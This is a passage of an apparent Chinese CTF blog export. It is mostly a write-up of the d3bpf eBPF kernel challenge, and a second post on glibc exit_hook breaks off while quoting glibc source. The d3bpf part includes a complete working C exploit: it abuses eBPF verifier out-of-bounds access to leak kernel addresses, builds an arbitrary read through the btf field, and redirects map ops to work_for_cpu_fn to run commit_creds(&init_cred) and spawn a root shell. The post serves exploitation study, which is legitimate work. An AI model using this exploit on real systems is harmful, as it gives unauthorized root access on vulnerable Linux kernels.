8),BPF_EXIT_INSN(),\n\n只需要将oob_map的array_map_ops放到store_map的value中去即可。并且在bpf_map中存在一个成员work是一个双向链表的结构，其中存在一个地址指向自己，这样我们即可获取oob_map的地址了。\n不过在实际做的过程中会发现上述利用方式会存在许多问题，达不到真正意义上的任意内存读，这里我忘记了具体原因，应该是会检测寄存器的值不能为堆栈以外的地址，所以还需要利用一个新的办法，obj_get_info_by_fd函数:\nstatic int bpf_map_get_info_by_fd(struct file *file,\t\t\t\t  struct bpf_map *map,\t\t\t\t  const union bpf_attr *attr,\t\t\t\t  union bpf_attr __user *uattr)&#123;\tstruct bpf_map_info __user *uinfo = u64_to_user_ptr(attr-&gt;info.info);\tstruct bpf_map_info info;\tu32 info_len = attr-&gt;info.info_len;\tint err;\terr = bpf_check_uarg_tail_zero(uinfo, sizeof(info), info_len);\tif (err)\t\treturn err;\tinfo_len = min_t(u32, sizeof(info), info_len);\tmemset(&amp;info, 0, sizeof(info));\tinfo.type = map-&gt;map_type;\tinfo.id = map-&gt;id;\tinfo.key_size = map-&gt;key_size;\tinfo.value_size = map-&gt;value_size;\tinfo.max_entries = map-&gt;max_entries;\tinfo.map_flags = map-&gt;map_flags;\tmemcpy(info.name, map-&gt;name, sizeof(map-&gt;name));\tif (map-&gt;btf) &#123;\t\tinfo.btf_id = btf_obj_id(map-&gt;btf);\t\tinfo.btf_key_type_id = map-&gt;btf_key_type_id;\t\tinfo.btf_value_type_id = map-&gt;btf_value_type_id;\t&#125;\tinfo.btf_vmlinux_value_type_id = map-&gt;btf_vmlinux_value_type_id;\tif (bpf_map_is_dev_bound(map)) &#123;\t\terr = bpf_map_offload_info_fill(&amp;info, map);\t\tif (err)\t\t\treturn err;\t&#125;\tif (copy_to_user(uinfo, &amp;info, info_len) ||\t    put_user(info_len, &amp;uattr-&gt;info.info_len))\t\treturn -EFAULT;\treturn 0;&#125;\n\nu32 btf_obj_id(const struct btf *btf)&#123;\treturn btf-&gt;id;&#125;\n\n所以如果我们控制bpf_map结构体中的btf即可实现真正意义上的任意地址泄漏。\n提权其实这里的提权方式可能大家都能想到，因为在bpf_map结构体中存在一个结构体为ops，而我们在以往的kernel题目中利用的比较多的就是这个ops，所以这里同样可以这样使用。\n这里选择的最终利用函数是前面提到过的work_for_cpu_fn函数。过程就是，首先我们需要先泄漏出当前ops结构体中的所有函数地址，随后将函数地址中map_get_next_key函数所在位置的指针替换为work_for_cpu_fn，紧接着写入到oob_map的value中去。\nstatic int map_get_next_key(union bpf_attr *attr)&#123;\tvoid __user *ukey = u64_to_user_ptr(attr-&gt;key);\tvoid __user *unext_key = u64_to_user_ptr(attr-&gt;next_key);\tint ufd = attr-&gt;map_fd;\tstruct bpf_map *map;\tvoid *key, *next_key;\tstruct fd f;\tint err;\tif (CHECK_ATTR(BPF_MAP_GET_NEXT_KEY))\t\treturn -EINVAL;\tf = fdget(ufd);\tmap = __bpf_map_get(f);\tif (IS_ERR(map))\t\treturn PTR_ERR(map);\tif (!(map_get_sys_perms(map, f) &amp; FMODE_CAN_READ)) &#123;\t\terr = -EPERM;\t\tgoto err_put;\t&#125;\tif (ukey) &#123;\t\tkey = __bpf_copy_key(ukey, map-&gt;key_size);\t\tif (IS_ERR(key)) &#123;\t\t\terr = PTR_ERR(key);\t\t\tgoto err_put;\t\t&#125;\t&#125; else &#123;\t\tkey = NULL;\t&#125;\terr = -ENOMEM;\tnext_key = kvmalloc(map-&gt;key_size, GFP_USER);\tif (!next_key)\t\tgoto free_key;\tif (bpf_map_is_dev_bound(map)) &#123;\t\terr = bpf_map_offload_get_next_key(map, key, next_key);\t\tgoto out;\t&#125;\trcu_read_lock();\terr = map-&gt;ops-&gt;map_get_next_key(map, key, next_key);\trcu_read_unlock();out:\tif (err)\t\tgoto free_next_key;\terr = -EFAULT;\tif (copy_to_user(unext_key, next_key, map-&gt;key_size) != 0)\t\tgoto free_next_key;\terr = 0;free_next_key:\tkvfree(next_key);free_key:\tkvfree(key);err_put:\tfdput(f);\treturn err;&#125;\n\n这里选择这个函数的很明显，在中途直接调用了ops中的map_get_next_key，并且第一个参数为map。那么这个时候我们如果修改ops为我们的bpf-&gt;value即可调用到work_for_cpu_fn，那么在根据work_for_cpu_fn函数内部调整commit_creds和init_cred即可。\nexp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#include &lt;linux/bpf_common.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/bpf.h&gt;#ifndef _BPF_DEFS_H_#define _BPF_DEFS_H_#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM) \\    ((struct bpf_insn)&#123;                        \\        .code = CODE,                          \\        .dst_reg = DST,                        \\        .src_reg = SRC,                        \\        .off = OFF,                            \\        .imm = IMM&#125;)#define BPF_LD_IMM64_RAW(DST, SRC, IMM)              \\    ((struct bpf_insn)&#123;                              \\        .code = BPF_LD | BPF_DW | BPF_IMM,           \\        .dst_reg = DST,                              \\        .src_reg = SRC,                              \\        .off = 0,                                    \\        .imm = (__u32)(IMM)&#125;),                       \\        ((struct bpf_insn)&#123;                          \\            .code = 0, /* zero is reserved opcode */ \\            .dst_reg = 0,                            \\            .src_reg = 0,                            \\            .off = 0,                                \\            .imm = ((__u64)(IMM)) &gt;&gt; 32&#125;)/* Memory load, dst_reg = *(uint *) (src_reg + off16) */#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Memory store, *(uint *) (dst_reg + off16) = src_reg */#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \\    ((struct bpf_insn)&#123;                             \\        .code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \\        .dst_reg = DST,                             \\        .src_reg = SRC,                             \\        .off = OFF,                                 \\        .imm = 0&#125;)/* Conditional jumps against immediates, if (dst_reg &#x27;op&#x27; imm32) goto pc + off16 */#define BPF_JMP_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                       \\        .code = BPF_JMP | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                       \\        .src_reg = 0,                         \\        .off = OFF,                           \\        .imm = IMM&#125;)/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */#define BPF_JMP32_IMM(OP, DST, IMM, OFF)        \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_JMP32 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = OFF,                             \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = imm32 */#define BPF_MOV64_IMM(DST, IMM)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_K, \\        .dst_reg = DST,                      \\        .src_reg = 0,                        \\        .off = 0,                            \\        .imm = IMM&#125;)#define BPF_MOV32_IMM(DST, IMM)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_K, \\        .dst_reg = DST,                    \\        .src_reg = 0,                      \\        .off = 0,                          \\        .imm = IMM&#125;)/* Short form of mov, dst_reg = src_reg */#define BPF_MOV64_REG(DST, SRC)              \\    ((struct bpf_insn)&#123;                      \\        .code = BPF_ALU64 | BPF_MOV | BPF_X, \\        .dst_reg = DST,                      \\        .src_reg = SRC,                      \\        .off = 0,                            \\        .imm = 0&#125;)#define BPF_MOV32_REG(DST, SRC)            \\    ((struct bpf_insn)&#123;                    \\        .code = BPF_ALU | BPF_MOV | BPF_X, \\        .dst_reg = DST,                    \\        .src_reg = SRC,                    \\        .off = 0,                          \\        .imm = 0&#125;)/* ALU ops on immediates, bpf_add|sub|...: dst_reg += imm32 */#define BPF_ALU64_IMM(OP, DST, IMM)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \\        .dst_reg = DST,                         \\        .src_reg = 0,                           \\        .off = 0,                               \\        .imm = IMM&#125;)/* ALU ops on registers, bpf_add|sub|...: dst_reg += src_reg */#define BPF_ALU64_REG(OP, DST, SRC)             \\    ((struct bpf_insn)&#123;                         \\        .code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \\        .dst_reg = DST,                         \\        .src_reg = SRC,                         \\        .off = 0,                               \\        .imm = 0&#125;)/* Program exit */#define BPF_EXIT_INSN()             \\    ((struct bpf_insn)&#123;             \\        .code = BPF_JMP | BPF_EXIT, \\        .dst_reg = 0,               \\        .src_reg = 0,               \\        .off = 0,                   \\        .imm = 0&#125;)/* BPF_LD_IMM64 macro encodes single &#x27;load 64-bit immediate&#x27; insn */#define BPF_LD_IMM64(DST, IMM) \\    BPF_LD_IMM64_RAW(DST, 0, IMM)/* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */#define BPF_LD_MAP_FD(DST, MAP_FD) \\    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)// varies from userspace bpf_map_info definition so need to redefinestruct bpf_map_info_kernel&#123;    __u32 type;    __u32 id;    __u32 key_size;    __u32 value_size;    __u32 max_entries;    __u32 map_flags;    char name[BPF_OBJ_NAME_LEN];    __u32 ifindex;    __u32 btf_vmlinux_value_type_id;    __u64 netns_dev;    __u64 netns_ino;    __u32 btf_id;    __u32 btf_key_type_id;    __u32 btf_value_type_id;&#125; __attribute__((aligned(8)));#endifint bpf(int cmd, union bpf_attr *attrs)&#123;    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));&#125;int create_map(union bpf_attr *map_attrs)&#123;    return bpf(BPF_MAP_CREATE, map_attrs);&#125;int update_map_element(int fd, uint64_t key, void *value, uint64_t flags)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    attr.flags = flags;    return bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);&#125;int lookup_map_element(int fd, uint64_t key, void *value)&#123;    union bpf_attr attr = &#123;&#125;;    attr.map_fd = fd;    attr.key = (uint64_t)&amp;key;    attr.value = (uint64_t)value;    return bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);&#125;int obj_get_info_by_fd(union bpf_attr *attrs)&#123;    return bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);&#125;int map_get_next_key(union bpf_attr *attrs)&#123;    return bpf(BPF_MAP_GET_NEXT_KEY, attrs);&#125;int run_bpf_prog(struct bpf_insn *insn, uint32_t cnt, int *prog_fd_out)&#123;    int ret = -1;    int prog_fd = -1;    char verifier_log_buff[0x200000] = &#123;0&#125;;    int socks[2] = &#123;0&#125;;    union bpf_attr prog_attrs =        &#123;            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,            .insn_cnt = cnt,            .insns = (uint64_t)insn,            .license = (uint64_t) &quot;&quot;,            .log_level = 2,            .log_size = sizeof(verifier_log_buff),            .log_buf = (uint64_t)verifier_log_buff&#125;;    if (NULL != prog_fd_out)    &#123;        prog_fd = *prog_fd_out;    &#125;    if (0 &gt;= prog_fd)    &#123;        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);    &#125;    if (0 &gt; prog_fd)    &#123;        puts(verifier_log_buff);        goto done;    &#125;    if (0 != socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))    &#123;        goto done;    &#125;    if (0 != setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, sizeof(int)))    &#123;        goto done;    &#125;    if (0x7 != write(socks[1], &quot;zzzzzzz&quot;, 7))    &#123;        goto done;    &#125;    if (NULL != prog_fd_out)    &#123;        *prog_fd_out = prog_fd;    &#125;    else    &#123;        close(prog_fd);    &#125;    ret = 0;done:    close(socks[0]);    close(socks[1]);    return ret;&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void err_exit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;#define EXP_REG BPF_REG_8#define OOB_REG BPF_REG_7#define STORE_REG BPF_REG_6#define attack(oob_map_fd, store_map_fd)                                     \\    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \\        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \\        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \\        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \\        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \\        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \\        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \\        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \\        BPF_EXIT_INSN(),                                                     \\        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \\        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \\        BPF_MOV64_IMM(EXP_REG, 1),                                           \\        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \\        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \\        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \\        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \\        BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \\        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)static int setup_btf_bpf_prog_fd;void read_kernel(int oob_map_fd, int store_map_fd, unsigned long addr, char *buf, int len)&#123;    int i;    char values[0x1500] = &#123;0&#125;;    struct bpf_insn read_map_ops_content[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0xD0),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 8),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),        BPF_MOV64_IMM(BPF_REG_0, 0),        BPF_EXIT_INSN()&#125;;    for (i = 0; i &lt; len / 4; i++)    &#123;        memset(values, 0, sizeof(values));        struct bpf_map_info_kernel info = &#123;0&#125;;        union bpf_attr attr = &#123;            .info.bpf_fd = oob_map_fd,            .info.info = (long long unsigned int)&amp;info,            .info.info_len = sizeof(info)&#125;;        ((unsigned long *)&amp;values[8])[0] = addr - 0x58;        if (addr == 0)        &#123;            ((uint64_t *)&amp;values[8])[0] = 0;        &#125;        if (0 != update_map_element(store_map_fd, 0, values, BPF_ANY))        &#123;            err_exit(&quot;[-] failed to update map element values!\\n&quot;);        &#125;        if (0 != run_bpf_prog(read_map_ops_content, sizeof(read_map_ops_content) / sizeof(read_map_ops_content[0]), &amp;setup_btf_bpf_prog_fd))        &#123;            err_exit(&quot;[-] Failed to run bpf program\\n&quot;);        &#125;        if (0 != obj_get_info_by_fd(&amp;attr))        &#123;            err_exit(&quot;[-] Failed to get map info\\n&quot;);        &#125;        addr = addr + 4;        ((uint32_t *)buf)[i] = info.btf_id;    &#125;    printf(&quot;%d\\n&quot;, i);&#125;unsigned long raw_array_map_ops = 0xffffffff820363a0;unsigned long kernel_addr;unsigned long kernel_base;unsigned long kernel_offset;int main()&#123;    // save_status();    union bpf_attr map_attr = &#123;        .map_type = BPF_MAP_TYPE_ARRAY,        .key_size = sizeof(int),        .value_size = 0x1500,        .max_entries = 1&#125;;    int store_map_fd = create_map(&amp;map_attr);    int oob_map_fd = create_map(&amp;map_attr);    if (store_map_fd &lt; 0 || oob_map_fd &lt; 0)    &#123;        err_exit(&quot;Failed to create map\\n&quot;);    &#125;    char *values = malloc(0x3000);    unsigned long ops[0x1000] = &#123;0&#125;;    memset(values, 0, sizeof(values));    if (0 != update_map_element(oob_map_fd, 0, values, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    if (0 != update_map_element(store_map_fd, 0, values, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    struct bpf_insn read_map_ops[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),        BPF_EXIT_INSN()&#125;;    if (0 != run_bpf_prog(read_map_ops, sizeof(read_map_ops) / sizeof(struct bpf_insn), NULL))    &#123;        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    &#125;    if (0 != lookup_map_element(store_map_fd, 0, values))    &#123;        err_exit(&quot;[-] Failed to lookup map element\\n&quot;);    &#125;    unsigned long array_map_ops = ((unsigned long *)(&amp;values[8]))[0];    kernel_offset = array_map_ops - raw_array_map_ops;    kernel_base = 0xffffffff81000000 + kernel_offset;    unsigned long modprobe_path_addr = 0x1a6c240 + kernel_base;    unsigned long work_for_cpu_fn_addr = kernel_offset + 0xffffffff810bc190;    unsigned long commit_creds_addr = kernel_offset + 0xffffffff810cce30;    unsigned long init_creds_addr = kernel_offset + 0xffffffff82a6b880;    printf(&quot;array_map_ops_addr =&gt; %p\\n&quot;, array_map_ops);    printf(&quot;kernel_base =&gt; %p\\n&quot;, kernel_base);    printf(&quot;kernel_offset =&gt; %p\\n&quot;, kernel_offset);    printf(&quot;modprobe_path =&gt; %p\\n&quot;, modprobe_path_addr);    printf(&quot;work_for_cpu_fn =&gt; %p\\n&quot;, work_for_cpu_fn_addr);    printf(&quot;commit_creds_addr =&gt; %p\\n&quot;, commit_creds_addr);    printf(&quot;init_creds_addr =&gt; %p\\n&quot;, init_creds_addr);    struct bpf_insn read_map_addr[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110 - 0xc0),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, 0),        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, 8),        BPF_EXIT_INSN()&#125;;    if (0 != run_bpf_prog(read_map_addr, sizeof(read_map_addr) / sizeof(struct bpf_insn), NULL))    &#123;        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    &#125;    if (0 != lookup_map_element(store_map_fd, 0, values))    &#123;        err_exit(&quot;[-] Failed to lookup map element\\n&quot;);    &#125;    unsigned long map_ptr = ((unsigned long *)(&amp;values[8]))[0];    printf(&quot;map_ptr =&gt; %p\\n&quot;, map_ptr);    printf(&quot;gap =&gt; %p\\n&quot;, (modprobe_path_addr - map_ptr));    unsigned long map_value = map_ptr - 0xc0 + 0x110;    // 0x79706f432f00    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, 0xf0);    *((unsigned long *)(values + 8 * 4)) = work_for_cpu_fn_addr;    if (0 != update_map_element(oob_map_fd, 0, values, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    puts(&quot;get_ops!&quot;);    struct bpf_insn modify_oob_map[] = &#123;        attack(oob_map_fd, store_map_fd),        BPF_ALU64_IMM(BPF_MUL, EXP_REG, 0x110),        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x20),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0x20),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x28),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0x28),        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, 0x30),        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, 0),        BPF_EXIT_INSN()&#125;;    ops[4] = commit_creds_addr;    ops[5] = init_creds_addr;    ops[6] = map_value;    if (0 != update_map_element(store_map_fd, 0, ops, BPF_ANY))    &#123;        err_exit(&quot;[-] failed to update map element values!\\n&quot;);    &#125;    if (0 != run_bpf_prog(modify_oob_map, sizeof(modify_oob_map) / sizeof(struct bpf_insn), NULL))    &#123;        err_exit(&quot;[-] Failed to run bpf program\\n&quot;);    &#125;    puts(&quot;[+] updated oob_map&quot;);    unsigned long key = 0;    unsigned long next_key;    union bpf_attr attr = &#123;        .map_fd = oob_map_fd,        .key = &amp;key,        .next_key = &amp;next_key&#125;;    map_get_next_key(&amp;attr);    printf(&quot;[+] commit_cred(&amp;init_cred) done!\\n&quot;);    get_shell();    return 0;&#125;\n\n\n\n题目放在: https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip\n","categories":["Linux Kernel"],"tags":["ebpf"]},{"title":"exit_hook","url":"/2022/06/18/exit-hook/","content":"众所周知的俩hook在glibc2.34移除了，不过exit_hook好像在这个版本的glibc表现得也不是很佳，不过在近期遇到的两道题目都需要用到这方面的知识所以来补了。\nexit_hook首先呢，程序正常退出以及使用exit函数都会调用exit所以不仅限于存在exit的题目适合\n源码分析void    exit (int status)&#123;    __run_exit_handlers (status, &amp;__exit_funcs, true, true);&#125;libc_hidden_def (exit)\n\nexit函数就只是单纯的调用了另一个函数，重点还是在另一个函数上面\nvoid    attribute_hidden    __run_exit_handlers (int status, struct exit_function_list **listp,                         bool run_list_atexit, bool run_dtors)&#123;    /* First, call the TLS destructors.  */    #ifndef SHARED    if (&amp;__call_tls_dtors != NULL)        #endif        if (run_dtors)            __call_tls_dtors ();    /* We do it this way to handle recursive calls to exit () made by     the functions registered with `atexit&#x27; and `on_exit&#x27;. We call     everyone on the list and use the status value in the last     exit (). */    while (true)    &#123;        struct exit_function_list *cur;        __libc_lock_lock (__exit_funcs_lock);        restart:        cur = *listp;        if (cur == NULL)        &#123;            /* Exit processing complete.  We will not allow any more\t     atexit/on_exit registrations.  */            __exit_funcs_done = true;            __libc_lock_unlock (__exit_funcs_lock);            break;        &#125;        while (cur-&gt;idx &gt; 0)        &#123;            struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];            const uint64_t new_exitfn_called = __new_exitfn_called;            /* Unlock the list while we call a foreign function.  */            __libc_lock_unlock (__exit_funcs_lock);            switch (f-&gt;flavor)            &#123;                    void (*atfct) (void);                    void (*onfct) (int status, void *arg);                    void (*cxafct) (void *arg, int status);                case ef_free:                case ef_us:                    break;                case ef_on:                    onfct = f-&gt;func.on.fn;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (onfct);                    #endif                    onfct (status, f-&gt;func.on.arg);                    break;                case ef_at:                    atfct = f-&gt;func.at;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (atfct);                    #endif                    atfct ();                    break;                case ef_cxa:                    /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),\t\t we must mark this function as ef_free.  */                    f-&gt;flavor = ef_free;                    cxafct = f-&gt;func.cxa.fn;                    #ifdef PTR_DEMANGLE                    PTR_DEMANGLE (cxafct);                    #endif                    cxafct (f-&gt;func.cxa.arg, status);                    break;            &#125;            /* Re-lock again before looking at global state.  */            __libc_lock_lock (__exit_funcs_lock);            if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))                /* The last exit function, or another thread, has registered\t       more exit functions.  Start the loop over.  */                goto restart;        &#125;        *listp = cur-&gt;next;        if (*listp != NULL)            /* Don&#x27;t free the last element in the chain, this is the statically\t   allocate element.  */            free (cur);        __libc_lock_unlock (__exit_funcs_lock);    &#125;    if (run_list_atexit)        RUN_HOOK (__libc_atexit, ());    _exit (status);&#125;\n\n这里先将源码放在这里，因为但看源码看不出什么\n\n但是通过调试可以看到这里是调用了_dl_fini函数，而这个函数在house of banana中提到过并且适用libc的版本还挺高在glibc2.34都是可以使用的。\nvoid    _dl_fini (void)&#123;    /* Lots of fun ahead.  We have to call the destructors for all still     loaded objects, in all namespaces.  The problem is that the ELF     specification now demands that dependencies between the modules     are taken into account.  I.e., the destructor for a module is     called before the ones for any of its dependencies.     To make things more complicated, we cannot simply use the reverse     order of the constructors.  Since the user might have loaded objects     using `dlopen&#x27; there are possibly several other modules with its     dependencies to be taken into account.  Therefore we have to start     determining the order of the modules once again from the beginning.  */    /* We run the destructors of the main namespaces last.  As for the     other namespaces, we pick run the destructors in them in reverse     order of the namespace ID.  */    #ifdef SHARED    int do_audit = 0;    again:    #endif    for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;        /* Protect against concurrent loads and unloads.  */        __rtld_lock_lock_recursive (GL(dl_load_lock));        unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;        /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */        if (nloaded == 0            #ifdef SHARED            || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit            #endif           )            __rtld_lock_unlock_recursive (GL(dl_load_lock));        else        &#123;            /* Now we can allocate an array to hold all the pointers and\t     copy the pointers in.  */            struct link_map *maps[nloaded];            unsigned int i;            struct link_map *l;            assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);            for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)                /* Do not handle ld.so in secondary namespaces.  */                if (l == l-&gt;l_real)                &#123;                    assert (i &lt; nloaded);                    maps[i] = l;                    l-&gt;l_idx = i;                    ++i;                    /* Bump l_direct_opencount of all objects so that they\t\t   are not dlclose()ed from underneath us.  */                    ++l-&gt;l_direct_opencount;                &#125;            assert (ns != LM_ID_BASE || i == nloaded);            assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);            unsigned int nmaps = i;            /* Now we have to do the sorting.  We can skip looking for the\t     binary itself which is at the front of the search list for\t     the main namespace.  */            _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),                           NULL, true);            /* We do not rely on the linked list of loaded object anymore\t     from this point on.  We have our own list here (maps).  The\t     various members of this list cannot vanish since the open\t     count is too high and will be decremented in this loop.  So\t     we release the lock so that some code which might be called\t     from a destructor can directly or indirectly access the\t     lock.  */            __rtld_lock_unlock_recursive (GL(dl_load_lock));            /* &#x27;maps&#x27; now contains the objects in the right order.  Now\t     call the destructors.  We have to process this array from\t     the front.  */            for (i = 0; i &lt; nmaps; ++i)            &#123;                struct link_map *l = maps[i];                if (l-&gt;l_init_called)                &#123;                    /* Make sure nothing happens if we are called twice.  */                    l-&gt;l_init_called = 0;                    /* Is there a destructor function?  */                    if (l-&gt;l_info[DT_FINI_ARRAY] != NULL                        || l-&gt;l_info[DT_FINI] != NULL)                    &#123;                        /* When debugging print a message first.  */                        if (__builtin_expect (GLRO(dl_debug_mask)                                              &amp; DL_DEBUG_IMPCALLS, 0))                            _dl_debug_printf (&quot;\\ncalling fini: %s [%lu]\\n\\n&quot;,                                              DSO_FILENAME (l-&gt;l_name),                                              ns);                        /* First see whether an array is given.  */                        if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)                        &#123;                            ElfW(Addr) *array =                                (ElfW(Addr) *) (l-&gt;l_addr                                                + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);                            unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val                                              / sizeof (ElfW(Addr)));                            while (i-- &gt; 0)                                ((fini_t) array[i]) ();                        &#125;                        /* Next try the old-style destructor.  */                        if (l-&gt;l_info[DT_FINI] != NULL)                            DL_CALL_DT_FINI                            (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);                    &#125;                    #ifdef SHARED                    /* Auditing checkpoint: another object closed.  */                    if (!do_audit &amp;&amp; __builtin_expect (GLRO(dl_naudit) &gt; 0, 0))                    &#123;                        struct audit_ifaces *afct = GLRO(dl_audit);                  